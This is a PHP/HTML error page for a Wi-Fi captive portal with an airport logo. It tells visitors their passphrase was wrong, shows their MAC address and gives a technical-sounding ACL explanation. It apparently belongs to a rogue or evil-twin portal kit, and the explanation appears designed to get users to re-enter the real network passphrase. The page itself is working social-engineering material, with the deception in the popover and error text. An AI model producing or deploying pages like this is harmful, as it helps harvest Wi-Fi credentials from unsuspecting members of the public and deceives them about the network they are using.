<?php
$destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "";
require_once('helper.php');
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <link rel="stylesheet" href="/css/bootstrap-4.3.1.min.css">
    <script type="text/javascript" src="/js/jquery-3.7.1.min.js"></script>
    <script type="text/javascript" src="/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="/style.css">
    <script type="text/javascript" src="/func.js"></script>
    <title><?= $ssid ?></title>
</head>

<body>
    <div class="container mt-5">
        <div class="form-row justify-content-center">
            <div class="col-md-6">
                <div class="card rounded-lg border-light shadow">
                    <div class="card-body text-center">
                        <img src="airport-logo.png" class="img-fluid mb-3" style="max-width: 200; max-height: 100px; object-fit: contain;">
                        <h3 class="card-title text-center">Oops!</h3>
                        <p class="text-center small">It looks like you’ve entered an incorrect passphrase, please check your spelling and try again.</p>
                        <div class="d-flex justify-content-center">
                            <button class="btn btn-orange btn-block text-white mt-5" onclick="GoBack()">Go Back</button>
                        </div>
                        
                        <p class="text-left small text-muted mt-4 d-flex justify-content-between align-items-center">
                            STATUS: ERR_FAILED_AUTH
                        <p class="text-left small text-muted d-flex justify-content-between align-items-center">
                            Client MAC: <?=getClientMac($_SERVER['REMOTE_ADDR']);?>
                            <a href="#" class="popover-link first-popover" data-container="body" data-html="true" data-toggle="popover" data-placement="top" data-content="This has happened due to the Access Control List (ACL) settings implemented on the Wireless Access Point. This requires devices to re-authenticate themselves which will query the Access Point ACL. If your device is authorised to access this network, your device MAC will be allowed upon re-authentication via this Wireless Access Points integrated captive portal. Which is where you are seeing this message." title="ERR_FAILED_AUTH" data-trigger="focus" tabindex="0">Why did this happen?</a>
                        </p>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <p class="text-left small d-flex justify-content-center align-items-center">
        <a href="#" class="popover-link second-popover" data-container="body" data-html="true" data-toggle="popover" data-placement="top" data-content="You are not authorised to view router status." title="ERR_GET_STATUS" data-trigger="focus" tabindex="0"> Check Router Status</a>
    </p>

</body>
</html>
